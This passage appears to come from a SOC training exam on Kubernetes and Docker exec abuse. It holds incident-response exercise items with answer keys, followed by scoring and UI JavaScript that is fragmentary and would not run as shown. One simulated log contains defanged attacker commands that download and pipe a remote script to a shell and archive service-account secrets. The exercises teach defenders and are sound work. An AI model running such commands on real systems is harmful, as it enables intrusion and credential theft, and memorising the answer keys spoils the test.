vault-0 immediately — the Head of Platform owns the platform and wants it done","Pull the exec records and process events, and identify who owns 10[.]19[.]7[.]203 — evidence before touching the pod","Close it as the nightly unseal — the timing matches exactly and the account owns the pod"],"correct":1,"outcome":"Right — the timing match is exactly why the unseal story is dangerous: the baseline says the unseal never uses exec, so the conflict resolves against benign. Gather what the shell did and who owns the source while nothing is destroyed."},{"prompt":"The engineer insists the exec was his manual check. No human account appears anywhere in the audit. What now?","options":["Accept the claim and close — a senior engineer's word is sufficient evidence","Open an HR case against the engineer immediately — the claim contradicts the audit","Keep it open — the exec ran under vault-unsealer, not a human account; record the claim and verify the subnet owners"],"correct":2,"outcome":"Correct — the claim conflicts with the artefact, and the artefact wins: the exec rode the service-account identity. Recording the claim and verifying the subnet owner is the escalate-or-gather move; closing on a word, or jumping to an HR case, both skip the evidence."},{"prompt":"Access must be cut this hour, with the PKI service staying up. Which single change does that?","options":["Revoke the vault-unsealer token and strip pods/exec from its role — vault keeps serving, nothing restarts","Restart vault-0 on a clean node to be certain the session is gone from memory","Firewall-block 10[.]19[.]7[.]203 at the edge and leave the token itself live"],"correct":0,"outcome":"Yes — revocation and RBAC surgery stop re-exec with zero downtime. The restart is the Head of Platform's instinct and the common best practice, but it is wrong here: it drops the PKI service, destroys in-pod evidence, and leaves the token valid. The IP block alone leaves a portable token."},{"prompt":"The CMDB says legacy test; the pod terminates the production PKI root. Bridge is in three minutes.","options":["Close it as a test-system event — the CMDB is the system of record after all","Escalate to the IR lead with the evidence pack, flag the CMDB entry as stale, and keep the revocation in place","Wait for the morning shift to decide — it is nearly handover anyway"],"correct":1,"outcome":"Right — escalate with the pack: the source host is unidentified, the shell's actions are uncaptured, and the CMDB conflict means the asset value was misjudged all night. Handing it over escalated, with revocation live, is the defensible hand-off."}],"hint":"Two constraints bind every step: the token outlives any restart, and the shell's actions are still uncaptured.","explanation":"<p>The chain: <b>gather evidence<\/b> before touching a pod whose shell activity is unknown, <b>resolve the alibi conflict<\/b> in favour of the artefact — the exec ran under the service-account identity, so the engineer's claim cannot close it — cut access with the <b>no-downtime<\/b> move (revoke token, strip the pods/exec verb) rather than the restart that is best practice elsewhere but wrong here, and <b>escalate<\/b> with the evidence pack while flagging the stale CMDB. The real-cost trade-off is explicit: a restart spends PKI downtime and evidence to achieve nothing the revocation does not, since credentials survive restarts anyway.<\/p>","study":"Ten-minute containment on a secrets-platform pod: evidence first, RBAC surgery over restarts, escalate with the pack."},
{"id":"EX-11","type":"drag-drop","summary":"Six artefacts into exposure, execution, credential impact.","concepts":["exposed Docker daemon (port 2375)","k8s audit logs pods/exec","kubectl get secrets credential theft","privileged DaemonSet abuse"],"scenario":"<p>You are writing the intruder replay for the IR report — the red-team-lead view of how one adversary moved through two platforms in a single night. Six artefacts from the case file have to be staged into the three phases the report uses: the exposure of the admin service that gave entry, the execution driven through that admin service, and the credential impact that followed. Two artefacts are pure exposure evidence, two show the T1609 execution itself in its two shapes — exec into a running pod and a kubectl-created privileged DaemonSet — and two prove the credential impact, one by volume and one by proof that contents, not just names, came back. Stage them in the order the report reads.<\/p>","question":"<p>Place each artefact into the phase it proves.<\/p>","bank":["Docker API on 2375 answers POST /v1.41/containers/{id}/exec with no authentication from any source","audit: verb=create resource=pods/exec  user=svc-billing  pod=ledger-api  from 10[.]19[.]7[.]203","audit: verb=get resource=secrets across 31 namespaces in 90 seconds","kubectl-created DaemonSet night-shift-miner with privileged:true and hostPID on every node","External host 198[.]51[.]100[.]9 pulls /v1.41/containers/json from the edge daemon at 03:00","responseObject sizes up to 187 KB on the secrets listing — contents came back, not just names"],"slots":[{"label":"Exposure of the admin service","accept":[0,4]},{"label":"Execution through the admin service (T1609)","accept":[1,3]},{"label":"Credential impact after execution","accept":[2,5]}],"hint":"Recon reads against the exposed daemon count as exposure evidence, not execution — reserve execution for the artefacts where commands ran.","explanation":"<p>Exposure: the unauthenticated <b>2375 Docker API accepting exec requests<\/b> is the open door itself, and the external <b>containers/json pull<\/b> is the adversary mapping what the door leads to — recon of the admin surface, not yet execution. Execution (T1609): the <b>pods/exec create<\/b> against the running ledger-api pod is exec-into-existing, and the <b>privileged hostPID DaemonSet on every node<\/b> is the kubectl-driven cluster-wide execution shape — CanisterWorm-style. Credential impact: <b>get secrets across 31 namespaces<\/b> is the mass theft, and the <b>187 KB response sizes<\/b> are what turn a name-list claim into proof the secret contents were downloaded — the fact the card-scheme report turns on.<\/p>","study":"Staging a T1609 incident: exposure, execution, credential impact."},
{"id":"EX-12","type":"line-select","summary":"Edge Docker API: the intruder rides an allow-listed jump host.","concepts":["exposed Docker daemon (port 2375)","anomalous management utility use","unusual accounts and IPs outside management plane","conflicting signals resolution"],"artifactNote":"Docker API log, the jump host's scheduler record and the stale allow-list note.","scenario":"<p>00:40 — edge host <b>edge-shop-02<\/b>, remote Docker daemon on 2375. The allow-list has two entries: the deploy server 10[.]40[.]2[.]9, and the DMZ jump host 10[.]40[.]6[.]18 — added \"temporarily\" years ago, with hardening ticket HB-2210 to remove it open for 214 days. Tonight every suspicious request comes from the jump host, an address the firewall happily passes — the classic conflicting signal, because the source is allow-listed even though the behaviour is not baseline. The deploy server shows only its nightly health check. The scheduler record for the jump host is the missing constraint that resolves the conflict, and the exec'd command chain shows what the session was for.<\/p><pre class=\"art mono\">(edge-shop-02 Docker API — 00:12-00:57)\n00:12:41  GET  /v1.41/containers/json            src=10[.]40[.]6[.]18   200   (18 containers)\n00:13:02  POST /v1.41/containers/pay-cron-1/exec  src=10[.]40[.]6[.]18   201\n00:13:03  POST /v1.41/exec/9f21b7/start           src=10[.]40[.]6[.]18   200  (Tty=true)\n00:13:06  proc: sh -c wget hxxp[:]//91[.]240[.]118[.]29/s[.]sh | sh   (pay-cron-1)\n00:26:37  GET  /_ping                             src=10[.]40[.]2[.]9    200   (deploy server nightly health)\n00:41:55  POST /v1.41/containers/pay-cron-2/exec  src=10[.]40[.]6[.]18   201\n00:44:19  proc: tar czf /tmp/c[.]tgz /var/run/secrets                 (pay-cron-2)\n00:57:23  GET  /v1.41/containers/json             src=10[.]40[.]2[.]9    200<\/pre><div class=\"ticket\"><span class=\"k\">Job scheduler — jump host 10[.]40[.]6[.]18<\/span> last deployment job 18:40 · nothing scheduled 00:00–02:00 · no interactive sessions booked tonight.<\/div><pre class=\"art mono\">(CMDB / allow-list note)\n10[.]40[.]2[.]9  deploy server — nightly health check at 00:26, in CMDB\n10[.]40[.]6[.]18 DMZ jump host — allow-listed by legacy rule; removal ticket HB-2210 open 214 days<\/pre>","question":"<p>Click the <b>three<\/b> Docker API requests that came from the intruder's relay.<\/p>","logLines":["00:12:41  GET  /v1.41/containers/json            src=10[.]40[.]6[.]18   200   (18 containers)","00:13:02  POST /v1.41/containers/pay-cron-1/exec  src=10[.]40[.]6[.]18   201","00:13:03  POST /v1.41/exec/9f21b7/start           src=10[.]40[.]6[.]18   200  (Tty=true)","00:13:06  proc: sh -c wget hxxp[:]//91[.]240[.]118[.]29/s[.]sh | sh   (pay-cron-1)","00:26:37  GET  /_ping                             src=10[.]40[.]2[.]9    200   (deploy server nightly health)","00:41:55  POST /v1.41/containers/pay-cron-2/exec  src=10[.]40[.]6[.]18   201","00:44:19  proc: tar czf /tmp/c[.]tgz /var/run/secrets                 (pay-cron-2)","00:57:23  GET  /v1.41/containers/json             src=10[.]40[.]2[.]9    200"],"badLines":[1,2,5],"hint":"An allow-listed source is not an allowed action — the scheduler record for the jump host is the constraint that settles which requests are unexplained.","explanation":"<p>Lines 2, 3 and 6 are the intruder's requests: the <b>exec-create<\/b> on pay-cron-1, its <b>exec-start<\/b> opening the TTY session, and the <b>second exec-create<\/b> on pay-cron-2 — the API equivalent of docker exec through the <b>exposed 2375 daemon<\/b>, driving <b>anomalous management utility use<\/b>. The conflicting signal — the source is the allow-listed jump host — resolves against benign: the scheduler shows no job and no booked session for that host tonight, the targets are payment cron containers, and the process lines show a downloader and a secrets tarball, which is not any deploy behaviour. The initial containers/json pull at 00:12 is reconnaissance by the same relay but the three <b>requests<\/b> asked for are the exec calls. The deploy server's health checks at 00:26 and 00:57 are CMDB-baselined and stay benign. The stale allow-list rule is the root cause HB-2210 should have closed.<\/p>","study":"Allow-listed sources behaving outside baseline; exec-create/exec-start pairs on an exposed Docker daemon."},
{"id":"EX-13","type":"matching","summary":"Match four campaigns to the SOC-visible T1609 signature.","concepts":["Mini Shai-Hulud secrets gathering","TeamPCP Cloud Stealer","CanisterWorm privileged DaemonSets","Hildegard via kubelet API (TeamTNT)"],"artifactNote":"The intel review card with the four software IDs in play.","scenario":"<p>Intel review, 06:00. The detection engineering team wants each campaign mapped to the SOC-visible signature — what your dashboards actually show when that operator works — because two of the four look nearly identical in a raw audit log: both drive kubectl against secrets. The pairing has to come from the documented behaviour of each software ID, and the near-identical pair must be separated by what each does with the access, not by the command it shares. Getting Hildegard's door wrong is the classic error too: it does not arrive through the API server front door at all.<\/p><pre class=\"art mono\">(intel card — software IDs in play)\nS9043  Mini Shai-Hulud\nS9041  TeamPCP Cloud Stealer\nS9042  CanisterWorm\nS0601  Hildegard (TeamTNT G0139)<\/pre>","question":"<p>Click a campaign on the left, then the SOC-visible signature it produces on the right.<\/p>","pairs":[{"left":"Mini Shai-Hulud (S9043)","right":"a wave of kubectl get secrets calls harvesting credentials cluster-wide"},{"left":"TeamPCP Cloud Stealer (S9041)","right":"stored secrets extracted out through the same admin commands once access existed"},{"left":"CanisterWorm (S9042)","right":"kubectl-created privileged DaemonSets landing on every node ahead of wiping"},{"left":"Hildegard (S0601, TeamTNT)","right":"commands pushed through the kubelet API, then exec into running containers"}],"hint":"Two cards share one command but differ in what they did with it; the fourth never uses the API server's front door.","explanation":"<p>The near-identical pair separates by outcome: <b>Mini Shai-Hulud (S9043)<\/b> is the gathering wave — kubectl get secrets harvesting credentials cluster-wide — while <b>TeamPCP Cloud Stealer (S9041)<\/b> extracted stored secrets through the same admin commands once access existed. <b>CanisterWorm (S9042)<\/b> shows up as kubectl-created <b>privileged DaemonSets on every node<\/b>, the staging step ahead of data wiping. <b>Hildegard (S0601)<\/b> never comes through 6443: it was executed via the <b>kubelet API run command<\/b> and then exec'd into running containers — the door that 10250 telemetry, not API-server audit, catches.<\/p>","study":"ATT&CK T1609 Procedure Examples: S9043, S9041, S9042, S0601."},
{"id":"EX-14","type":"terminal","summary":"Capture vault-0 spec and logs under legal hold, touch nothing.","concepts":["evidence-safe vs destructive action","k8s audit logs pods/exec"],"scenario":"<p>04:20 — legal hold is active on cluster meridian-secrets. The IR lead's instruction: \"Before containment touches anything on <b>vault-0<\/b>, I need its full pod spec and its current container logs written to /ir/vault-0/ — and I mean read-only. No exec into the pod: your own pods/exec create would land in the audit trail we are about to hand to the card scheme and contaminate the timeline. No restart, no delete, no describe-sessions tricks that open a session. The pod keeps running exactly as it is.\" The jump host has your admin context pre-configured and /ir/vault-0/ already exists. The card-scheme report will quote the file hashes of whatever you write here, so completeness matters: all containers' logs, and the full object spec, not the summary table.<\/p><pre class=\"art mono\">environment: responder@jump:~$  (admin context set; /ir/vault-0/ exists)\nconstraints: read-only gets only; one line; no exec, no restart, no delete\noutputs:     /ir/vault-0/spec.yaml  and  /ir/vault-0/logs.txt<\/pre>","question":"<p>Type the one compound command that writes the full pod spec of vault-0 to /ir/vault-0/spec.yaml and all its container logs to /ir/vault-0/logs.txt.<\/p>","shellPrompt":"responder@jump:~$","expected":"kubectl get pod vault-0 -o yaml > /ir/vault-0/spec.yaml && kubectl logs vault-0 --all-containers > /ir/vault-0/logs.txt","elements":[{"any":["kubectl get pod","kubectl get pods"],"label":"the read-only spec fetch"},{"any":["-o yaml","-o=yaml","-o json"],"label":"full object output, not the summary table"},{"any":["kubectl logs"],"label":"the container-log fetch"},{"any":["&&",";"],"label":"both captures chained on one line"}],"hint":"Two read-only fetches in one chained line: the spec needs full-object output and the logs need every container — and nothing in the line may open a session into the pod.","explanation":"<p><span class=\"mono\">kubectl get pod vault-0 -o yaml > /ir/vault-0/spec.yaml &amp;&amp; kubectl logs vault-0 --all-containers > /ir/vault-0/logs.txt<\/span> captures both artefacts with two pure reads chained together. The get with <span class=\"mono\">-o yaml<\/span> writes the complete object — security contexts, volumes, mounted tokens — rather than the summary table; <span class=\"mono\">kubectl logs --all-containers<\/span> covers every container in the pod without attaching to anything. Neither command creates a pods/exec entry, so the audit trail stays clean for the card scheme; an exec-based capture, a restart-to-preserve, or a copy-the-pod shortcut would each either contaminate the timeline or destroy the live state the legal hold protects.<\/p>","study":"Evidence capture under legal hold: read-only gets, full-object output, zero exec footprint."},
{"id":"EX-15","type":"qcm-single","summary":"The last exec of the night: close it or hand it over escalated?","concepts":["conflicting signals resolution","escalate or gather more evidence"],"artifactNote":"The watch handover extract, the change ticket and the runbook step.","scenario":"<p>06:50 — shift end. The watch handover shows one open exec left from the night: <span class=\"mono\">nightly-report-sa<\/span> created a pods/exec session into <span class=\"mono\">reporting-gen-0<\/span> at 05:58 from <span class=\"mono\">10[.]19[.]7[.]203<\/span>. Two facts argue for closing it: the identity's role genuinely holds pods/exec (granted last sprint under CHG-88441), and change ticket CHG-88512, owned by the reporting team, covers 05:30–07:00 for a \"reporting pipeline rebuild\". Two facts argue against: the session came from 10[.]19[.]7[.]203 — the workload/cron range that hosted Tuesday's confirmed intruder, still unquarantined, while the reporting rebuild always runs from the reporting subnet 10[.]40[.]11[.]0/24 — and the rebuild runbook's own step list uses a GitOps apply, never an exec. The morning lead, already on the bridge, wants the queue clean: \"Close it, the ticket covers the window.\"<\/p><pre class=\"art mono\">(watch handover — meridian-prod-1)\n05:58:12 verb=create resource=pods/exec  user=nightly-report-sa  src=10[.]19[.]7[.]203  pod=reporting-gen-0\nbaseline: nightly-report-sa execs only from 10[.]40[.]11[.]0/24\nopen item: 10[.]19[.]x host from Tuesday's incident — NOT yet quarantined<\/pre><div class=\"ticket\"><span class=\"k\">CHG-88512<\/span> reporting pipeline rebuild — window 05:30–07:00 — owner: reporting team — method: GitOps apply per runbook RB-208 (no exec step).<\/div><pre class=\"art mono\">(runbook RB-208, step 4 of 6)\n4. gitops apply -f releases/reporting/rebuild.yaml\n   (no interactive exec required; exec use indicates manual deviation)<\/pre>","question":"<p>Handover is in ten minutes. What is the correct disposition of this exec?<\/p>","options":["Close it — the change window, the RBAC grant and the reporting role all line up with the approved change ticket and its 05:30–07:00 window","Hand it over escalated: keep it open, verify who owns 10[.]19[.]7[.]203, confirm with the change owner whether exec was in scope, keep the session records","Delete reporting-gen-0 so the exec session ends with the pod, then mark the change ticket complete and log it as a manual deviation","Page the CISO and isolate every node in the reporting namespace immediately — treat the whole namespace as compromised"],"correct":1,"hint":"The window and the RBAC grant both check out — the two things that do not are where the session came from and what the runbook actually does.","explanation":"<p>Hand it over escalated. The paperwork matches — window, grant, namespace — but two hard conflicts stay open: the source subnet is the same range as Tuesday's unquarantined intruder host, not the reporting subnet this identity always uses, and the runbook's method is a GitOps apply with an explicit note that exec means manual deviation. Trust-the-ticket is the best practice that is wrong here; the session may be the reporting team deviating, or the intruder returning through a still-live path — nobody can tell from the bridge. Closing loses a live lead; deleting the pod destroys the session's runtime context and closes nothing; isolating the namespace is disproportionate to an unverified single session. The escalated hand-over with three concrete checks is the defensible move.<\/p>","study":"End-of-shift dispositions: when paperwork matches but telemetry does not, escalate rather than close."});

(function () {

    else if (state === 'PAUSED_MANUAL') { ic.textContent = '⏸'; word.textContent = 'PAUSED — manual (press Resume)'; $('tbTimer').style.color = 'var(--state-paused)'; }
    else if (state === 'PAUSED_AUTO_CHECK') { ic.textContent = '⏸'; word.textContent = 'PAUSED — reviewing feedback (resumes on Next)'; $('tbTimer').style.color = 'var(--state-paused)'; }
    else if (state === 'ENDED') { ic.textContent = '⏹'; word.textContent = 'ENDED'; $('tbTimer').style.color = 'var(--state-incorrect)'; }
    else { ic.textContent = '⏱'; word.textContent = 'READY'; }

  function widgetFor(ex, box, wstate) {

  /* ---------------- scoring ---------------- */
  function scoreExercise(ex, wstate) {
    var items = [], N = 0, H = 0, W = 0, canon = null;
    function item(state, label) { items.push({ state: state, label: label }); }
    if (ex.type === 'qcm-single') {
      N = 1;
      var sel = wstate.sel && wstate.sel[0];
      if (sel === undefined) { item('mi', 'No option selected'); }
      else if (sel === ex.correct) { H = 1; item('ok', '✓ Correct — ' + strip(ex.options[ex.correct])); }
      else { W = 1; item('no', '✗ You chose: ' + strip(ex.options[sel])); }
      canon = ex.options[ex.correct];
    } else if (ex.type === 'qcm-multi') {
      N = ex.correct.length;
      var selset = wstate.sel || [];
      ex.correct.forEach(function (ci) {
        if (selset.indexOf(ci) >= 0) { H++; item('ok', '✓ Correct: ' + strip(ex.options[ci])); }
        else { item('mi', '○ Missed: ' + strip(ex.options[ci])); }
      });
      selset.forEach(function (si) { if (ex.correct.indexOf(si) < 0) { W++; item('no', '✗ Wrong: ' + strip(ex.options[si])); } });
      canon = ex.correct.map(function (ci) { return strip(ex.options[ci]); }).join(' · ');
    } else if (ex.type === 'fill-blank') {
      N = ex.blanks.length;
      ex.blanks.forEach(function (bl, bi) {
        var v = norm(wstate.vals && wstate.vals[bi]);
        var accept = [norm(bl.answer)].concat((bl.alts || []).map(norm));
        if (!v) { item('mi', '○ Missed blank ' + (bi + 1) + ' — expected: ' + esc(bl.answer)); }
        else if (accept.indexOf(v) >= 0) { H++; item('ok', '✓ Blank ' + (bi + 1) + ': ' + esc(bl.answer)); }
        else { W++; item('no', '✗ Blank ' + (bi + 1) + ' — you typed "' + esc(v) + '", expected: ' + esc(bl.answer)); }
      });
      canon = ex.blanks.map(function (bl) { return bl.answer; }).join(' | ');
    } else if (ex.type === 'drag-drop') {
      N = ex.bank.length;
      Object.keys(wstate.place || {}).forEach(function (k) {
        var bi = parseInt(k, 10), si = wstate.place[k];
        if (ex.slots[si] && ex.slots[si].accept.indexOf(bi) >= 0) { H++; item('ok', '✓ "' + strip(ex.bank[bi]) + '" → ' + esc(ex.slots[si].label)); }
        else { W++; item('no', '✗ "' + strip(ex.bank[bi]) + '" does not belong in ' + esc(ex.slots[si] ? ex.slots[si].label : '?')); }
      });
      ex.bank.forEach(function (t, bi) { if (wstate.place[bi] === undefined) item('mi', '○ Missed: "' + strip(t) + '" → ' + esc(slotLabelFor(ex, bi))); });
      canon = ex.slots.map(function (sl) { return sl.label + ': ' + sl.accept.map(function (bi) { return strip(ex.bank[bi]); }).join(', '); }).join(' | ');
    } else if (ex.type === 'ordering') {
      N = ex.items.length;
      var order = wstate.order || [];
      order.forEach(function (bi, pos) {
        if (bi === pos) { H++; item('ok', '✓ Position ' + (pos + 1) + ': ' + strip(ex.items[pos])); }
        else { W++; item('no', '✗ Position ' + (pos + 1) + ' — you put "' + strip(ex.items[bi]) + '", expected "' + strip(ex.items[pos]) + '"'); }
      });
      canon = ex.items.map(function (t, i) { return (i + 1) + '. ' + strip(t); }).join(' ');
    } else if (ex.type === 'matching') {
      N = ex.pairs.length;
      ex.pairs.forEach(function (p, li) {
        var a = (wstate.assign || {})[li];
        if (a === undefined) item('mi', '○ Missed: "' + strip(p.left) + '" → ' + esc(p.right));
        else if (a === li) { H++; item('ok', '✓ "' + strip(p.left) + '" → ' + esc(p.right)); }
        else { W++; item('no', '✗ "' + strip(p.left) + '" you matched to "' + strip(ex.pairs[a].right) + '", expected "' + esc(p.right) + '"'); }
      });
      canon = ex.pairs.map(function (p) { return strip(p.left) + ' = ' + strip(p.right); }).join(' | ');
    } else if (ex.type === 'terminal') {
      N = ex.elements.length;
      var cmd = norm(wstate.cmd || '');
      ex.elements.forEach(function (el2) {
        var hit = (el2.any || []).some(function (a) { return cmd.indexOf(String(a).toLowerCase()) >= 0; });
        if (hit) { H++; item('ok', '✓ ' + esc(el2.label)); }
        else { item('mi', '○ Missing: ' + esc(el2.label)); }
      });
      if (!cmd) item('mi', '○ Nothing typed — expected: ' + esc(ex.expected));
      canon = ex.expected;
    } else if (ex.type === 'line-select') {
      N = ex.badLines.length;
      var sel2 = wstate.sel || [];
      ex.badLines.forEach(function (li) {
        if (sel2.indexOf(li) >= 0) { H++; item('ok', '✓ Line ' + (li + 1) + ' is indeed the one to flag'); }
        else { item('mi', '○ Missed line ' + (li + 1) + ': ' + esc(shorten(ex.logLines[li], 90))); }
      });
      sel2.forEach(function (li) {
        if (ex.badLines.indexOf(li) < 0) { W++; item('no', '✗ Line ' + (li + 1) + ' is benign: ' + esc(shorten(ex.logLines[li], 80))); }
      });
      canon = ex.badLines.map(function (li) { return 'line ' + (li + 1); }).join(', ');
    } else if (ex.type === 'multi-step') {
      N = ex.steps.length;
      ex.steps.forEach(function (st, si) {
        var p = (wstate.picks || {})[si];
        if (p === undefined) item('mi', '○ Missed step ' + (si + 1) + ' — expected: ' + strip(st.options[st.correct]));
        else if (p === st.correct) { H++; item('ok', '✓ Step ' + (si + 1) + ': ' + strip(st.options[st.correct])); }
        else { W++; item('no', '✗ Step ' + (si + 1) + ' — you chose "' + strip(st.options[p]) + '", expected "' + strip(st.options[st.correct]) + '"'); }
      });
      canon = ex.steps.map(function (st, si) { return (si + 1) + '. ' + strip(st.options[st.correct]); }).join(' ');
    }
    var credit = N > 0 ? Math.max(0, (H - W) / N) : 0;
    if (N === 1) credit = H === 1 ? 1 : 0; /* single-answer: binary */
    if (S.answers[S.current].hintUsed) credit = Math.max(0, credit - 0.10);
    credit = Math.round(credit * 100) / 100;
    return { credit: credit, items: items, N: N, H: H, W: W, canon: canon };
  }
  function strip(s) { return esc(String(s).replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim()); }
  function shorten(s, n) { s = String(s); return s.length > n ? s.slice(0, n - 1) + '…' : s; }
  function slotLabelFor(ex, bi) { var lbl = ''; ex.slots.forEach(function (sl) { if (sl.accept.indexOf(bi) >= 0) lbl = sl.label; }); return lbl; }

  function renderTopbarButtons() {
    var bar = $('topbar');

    var b = el('button', 'btn btn-ghost', '⏸ Pause');
    b.type = 'button'; b.id = 'pauseBtn'; b.setAttribute('aria-label', 'Pause the exam (manual pause)');
    b.addEventListener('click', function () {
      if (S.timerState === 'RUNNING' || S.timerState === 'PAUSED_AUTO_CHECK') {
        S.priorState = S.timerState;
        setTimerState('PAUSED_MANUAL'); showPauseVeil();
      } else if (S.timerState === 'PAUSED_MANUAL') {
        hidePauseVeil(); setTimerState(S.priorState || 'RUNNING');
      }
    });
    bar.appendChild(b);
    var oldF = document.getElementById('finishBtn');
    if (oldF) oldF.remove();
    var f = el('button', 'btn btn-ghost', '⏹ Finish');
    f.type = 'button'; f.id = 'finishBtn'; f.setAttribute('aria-label', 'Finish the exam early');
    f.addEventListener('click', function () { finishExam(false); });
    bar.appendChild(f);
  }
  function showPauseVeil() {
    var stage = document.querySelector('.exam-stage');
    var old = stage.querySelector('.pause-veil'); if (old) old.remove();
    var veil = el('div', 'pause-veil',
      '<div class="pv-ic" aria-hidden="true">⏸</div><div class="pv-word">PAUSED — manual</div>' +
      '<div style="color:var(--text-secondary);max-width:420px">The exercise is hidden while you are on a break. The timer is stopped.</div>');
    var r = el('button', 'btn btn-primary', '▶ Resume');
    r.type = 'button'; r.setAttribute('aria-label', 'Resume the exam');
    r.addEventListener('click', function () {
      hidePauseVeil();
      setTimerState(S.priorState === 'PAUSED_AUTO_CHECK' ? 'PAUSED_AUTO_CHECK' : 'RUNNING');
    });
    veil.appendChild(r);
    stage.appendChild(veil);
    $('exerciseArea').querySelector('.card').style.visibility = 'hidden';
  }
  function hidePauseVeil() {
    var v = document.querySelector('.pause-veil'); if (v) v.remove();
    var c = $('exerciseArea').querySelector('.card'); if (c) c.style.visibility = 'visible';
  }

  function doCheck() {
    var i = S.current, ex = EXERCISES[i], a = S.answers[i];
    if (a.status === 'checked') return;
    var res = scoreExercise(ex, a.wstate);
    a.status = 'checked';
    a.credit = res.credit;
    a.result = res;
    a.label = res.credit >= 1 ? 'correct' : (res.credit > 0 ? 'partial' : 'incorrect');
    setTimerState('PAUSED_AUTO_CHECK'); /* check-triggered auto-pause */
    var card = $('exerciseArea').querySelector('.card');
    renderFeedback(card, ex, a, false);
    var cb = document.getElementById('checkBtn'); if (cb) cb.disabled = true;
    var sb = document.querySelector('#exerciseArea .btn-ghost'); /* skip button */ if (sb) sb.disabled = true;
    var hb = document.querySelector('#exerciseArea .btn-amber'); if (hb) hb.disabled = true;
    var nb = document.getElementById('nextBtn'); if (nb) nb.classList.remove('hidden');
    lockWidgets(card);
    updateScoreBar();
  }
  function lockWidgets(card) {
    var abody = card.querySelector('.blk-answer');
    if (!abody) return;
    abody.querySelectorAll('button, input').forEach(function (x) {
      x.disabled = true; x.style.pointerEvents = 'none'; x.readOnly = true;
      if (x.classList.contains('chip')) x.draggable = false;
    });
  }
  function renderFeedback(card, ex, a, restoring) {
    var old = card.querySelector('.fb'); if (old) old.remove();
    var res = a.result;
    var cls = a.label === 'correct' ? 'fb-correct' : (a.label === 'partial' ? 'fb-partial' : 'fb-incorrect');
    var word = a.label === 'correct' ? '✓ CORRECT' : (a.label === 'partial' ? '✓ PARTIALLY CORRECT' : '✗ INCORRECT');
    var fb = el('div', 'fb ' + cls);
    var hh = '<span>' + word + '</span>';
    if (res.N > 1) hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + ' — ' + res.H + '/' + res.N + ' items</span>';
    else hh += '<span class="fb-credit">credit ' + res.credit.toFixed(2) + '</span>';
    if (a.hintUsed) hh += '<span class="fb-credit">💡 hint −0.10 applied</span>';
    fb.appendChild(el('div', 'fb-h', hh));
    var it = el('div', 'fb-items');
    res.items.forEach(function (im) { it.appendChild(el('div', 'fb-item ' + im.state, '<span class="fi-ic">' + (im.state === 'ok' ? '✓' : im.state === 'no' ? '✗' : '○') + '</span><span>' + im.label + '</span>')); });
    fb.appendChild(it);
    if (res.canon) {
      var c = el('div', 'canon');
      c.appendChild(el('div', 'dd-hint', 'Correct answer:'));
      c.appendChild(el('pre', 'art', esc(res.canon)));
      fb.appendChild(c);
    }
    fb.appendChild(el('div', 'exp', ex.explanation));
    if (a.label !== 'correct' && ex.study) fb.appendChild(el('div', 'study', '📚 What to study: ' + esc(ex.study)));
    var acts = card.querySelector('.actions');
    card.insertBefore(fb, acts);
    fb.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }

  function doSkip() {
    var i = S.current, a = S.answers[i];
    if (a.status === 'checked') return;
    a.status = 'skipped';
    if (S.skipped.indexOf(i) < 0) S.skipped.push(i);
    /* no auto-pause: timer keeps running */
    advance();
  }
  function goNext() {
    if (S.timerState === 'PAUSED_AUTO_CHECK') setTimerState('RUNNING'); /* resume on Next */
    if (S.reviewMode) { S.reviewMode = false; renderReview(); showScreen('review'); return; }
    advance();
  }
  function advance() {
    var nxt = -1;
    for (var j = S.current + 1; j < EXERCISES.length; j++) { if (S.answers[j].status === 'unanswered') { nxt = j; break; } }
    if (nxt < 0) { /* none forward: go to review or results */
      for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered') { nxt = k; break; } }
    }
    if (nxt >= 0) renderExercise(nxt);
    else finishExam(false);
  }

  /* ---------------- review-skipped screen ---------------- */
  function renderReview() {
    var root = $('screen-review'); root.innerHTML = '';
    var c = el('div', 'card');
    c.appendChild(el('h2', null, '⚠ Review skipped exercises'));
    var open = S.skipped.filter(function (i) { return S.answers[i].status === 'skipped'; });
    if (open.length === 0) {
      c.appendChild(el('p', null, 'No skipped exercises left — everything was answered.'));
    } else {
      c.appendChild(el('p', 'dd-hint', 'You can return to any skipped exercise and answer it while the timer has not ended. Skipped-and-never-answered exercises are excluded from your score.'));
      open.forEach(function (i) {
        var row = el('div', 'rev-item');
        row.appendChild(el('span', 'ri-id', esc(EXERCISES[i].id)));
        row.appendChild(el('span', 'ri-sum', esc(EXERCISES[i].summary)));
        var b = el('button', 'btn btn-blue', '↩ Return to it');
        b.type = 'button'; b.setAttribute('aria-label', 'Return to ' + EXERCISES[i].id);
        b.addEventListener('click', function () { S.reviewMode = true; S.reviewFrom = 'review'; showScreen('exam'); renderExercise(i); });
        row.appendChild(b);
        c.appendChild(row);
      });
    }
    var acts = el('div', 'actions');
    var back = el('button', 'btn btn-ghost', '← Keep working (unanswered exercises)');
    back.type = 'button';
    back.addEventListener('click', function () {
      var u = -1; for (var k = 0; k < EXERCISES.length; k++) { if (S.answers[k].status === 'unanswered' && S.skipped.indexOf(k) < 0) { u = k; break; } }
      if (u < 0) u = -1;
      if (u >= 0) { showScreen('exam'); renderExercise(u); } else { finishExam(false); }
    });
    var fin = el('button', 'btn btn-primary', '⏹ Final submit');
    fin.type = 'button'; fin.setAttribute('aria-label', 'Final submit and show results');
    fin.addEventListener('click', function () { finishExam(false); });
    acts.appendChild(back); acts.appendChild(el('span', 'spacer')); acts.appendChild(fin);
    c.appendChild(acts);
    root.appendChild(c);
  }

  /* ---------------- results ---------------- */
  function finishExam(timeout) {
    var anySkippedOpen = S.skipped.some(function (i) { return S.answers[i].status === 'skipped'; });
    if (!timeout && anySkippedOpen && S.timerState !== 'ENDED' && S.screen !== 'review') { renderReview(); showScreen('review'); return; }
    setTimerState('ENDED');
    var r = creditSum();
    var answered = r.n;
    var percent = answered > 0 ? Math.round((r.sum / answered) * 100) : 0;
    var passed = percent >= (META.passMark || 70);
    /* counts */
    var full = 0, part = 0, zero = 0, skipped = 0, partSum = 0;
    EXERCISES.forEach(function (ex, i) {
      var st = S.answers[i].status;
      if (st === 'checked') {
        var cr = S.answers[i].credit;
        if (cr >= 1) full++;
        else if (cr > 0) { part++; partSum += cr; }
        else zero++;
      } else if (st === 'skipped') skipped++;
      else skipped++; /* unanswered at submit = excluded */
    });
    var root = $('screen-results'); root.innerHTML = '';
    var hero = el('div', 'card');
